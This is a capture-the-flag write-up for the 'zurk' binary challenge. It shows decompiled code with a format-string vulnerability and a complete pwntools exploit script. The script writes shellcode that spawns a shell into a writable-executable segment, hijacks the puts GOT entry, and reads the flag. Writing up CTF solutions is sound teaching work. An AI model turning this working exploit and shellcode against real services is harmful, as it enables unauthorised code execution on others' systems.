# zurk (84 solves)

Description:						 					

> nc binary.utctf.live 9003 
>
> *by: hk*



```c++
int main(int argc, const char **argv, const char **envp)
{
  welcome();  // print welcome message
  while ( 1 )
    do_move();
}
```

```c++
void do_move()
{
  char s[64]; // [rsp+0h] [rbp-40h]

  puts("What would you like to do?");
  fgets(s, 0x32, stdin);
  s[strcspn(s, "\n")] = 0;
  if ( !strcmp(s, "go west") )
  {
    puts("You move west to arrive in a cave dimly lit by torches.");
    puts("The cave two tunnels, one going east and the other going west.");
  }
  else if ( !strcmp(s, "go east") )
  {
    puts("You move east to arrive in a cave dimly lit by torches.");
    puts("The cave two tunnels, one going east and the other going west.");
  }
  else
  {
    printf(s);	// vulnurability
    puts(" is not a valid instruction.");
  }
}
```

Since the buffer on stack, we have simple write primitive

```
    Arch:     amd64-64-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x400000)
    RWX:      Has RWX segments
```

Since the binary has write execute (????) segment. We just write our shellcode from [here](http://shell-storm.org/shellcode/files/shellcode-806.php) to specified segment location.

After that, we overwrite GOT puts with address of our shellcode and jump to it :)

```python
from pwn import *
import sys
import binascii

base = 0x601101

# jump on me
# http://shell-storm.org/shellcode/files/shellcode-806.php
shellcode = "\x31\xc0\x90\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"

class Exploit:
    def __init__(self, debug=False):
        if debug:
            self.r = process('pwnable')
        else:
            self.r = remote('binary.utctf.live', 9003)
        self.count = 0

    def send_data(self, data):
        self.r.sendlineafter('What would you like to do?\n', data)

    def write_short(self, addr, val):
        payload = ''
        addr_to_str = '{}'.format(val).zfill(10)
        payload += '%{}x%9$hn'.format(addr_to_str)
        payload += 'A' * 7
        print(self.count)
        self.count += 1

        payload += p64(addr)
        self.send_data(payload)

    def write_qword(self, addr, val):
        payload = ''
        addr_to_str = '{}'.format(val).zfill(10)
        payload += '%{}x%9$lln'.format(addr_to_str)
        payload += 'A' * 6
        payload += p64(addr)
        self.send_data(payload)


    def attach(self):
        gdb.attach(self.r, 'b*0x400767')

    def run(self):
        # shellcode from above
        self.write_short(0x601101, 0xc031)
        self.write_short(0x601103, 0x4890)
        self.write_short(0x601105, 0xd1bb)
        self.write_short(0x601107, 0x969d)
        self.write_short(0x601109, 0xd091)
        self.write_short(0x60110b, 0x978c)
        self.write_short(0x60110d, 0x48ff)
        self.write_short(0x60110f, 0xdbf7)
        self.write_short(0x601111, 0x5453)
        self.write_short(0x601113, 0x995f)
        self.write_short(0x601115, 0x5752)
        self.write_short(0x601117, 0x5e54)
        self.write_short(0x601119, 0x9090)
        self.write_short(0x60111b, 0x3bb0)
        self.write_short(0x60111d, 0x050f)

        print('overwrite got')
        self.write_qword(0x601018, 0x601101)
        self.r.interactive()

def main():
    exp = Exploit()
    #exp.attach()
    exp.run()

if __name__ == "__main__":
    sys.exit(main())

```



```
$ ls
flag.txt
$ cat flag.txt
utflag{wtf_i_h4d_n0_buffer_overflows}
```

